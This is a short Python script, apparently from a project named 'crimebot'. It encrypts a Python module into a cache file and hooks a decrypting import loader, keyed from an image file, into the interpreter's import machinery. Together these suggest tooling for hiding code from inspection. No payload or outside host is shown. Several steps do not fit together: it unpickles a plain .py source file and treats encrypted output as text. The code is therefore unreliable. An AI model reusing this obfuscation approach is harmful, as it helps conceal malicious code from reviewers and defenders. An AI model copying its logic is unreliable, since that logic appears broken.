# encrypted_module.py
import logging
import os
import pathlib
import pickle

from sys import meta_path

from crimebot.obfuscator.pyc.decrypting_loader import DecryptingLoader


def write_module(
    to_encrypt_path: os.PathLike = pathlib.Path("./example.py"),
    output_path: os.PathLike = pathlib.Path("./example.pyc"),
):
    """Encrypts the module and writes the encrypted cache file to the output_path"""
    from crimebot.obfuscator.pyc.load_encryptor import LoadEncryptor

    encryptor = LoadEncryptor()
    with open(to_encrypt_path, "rb") as f:
        code_data = pickle.load(f)
    encrypted_code = encryptor.encrypt_code_object(code_data)
    with open(output_path, "wb") as f:
        f.write(bytes(encrypted_code, "utf-8"))


def inject():
    loader = DecryptingLoader("key_image.png")
    meta_path.insert(0, loader)
    try:
        loaded_module = loader.load_module("__main__")
        logging.debug(f"Loaded  module {loaded_module.__name__}")
    except ImportError as e:
        print(e)


if __name__ == "__main__":
    write_module()
    inject()
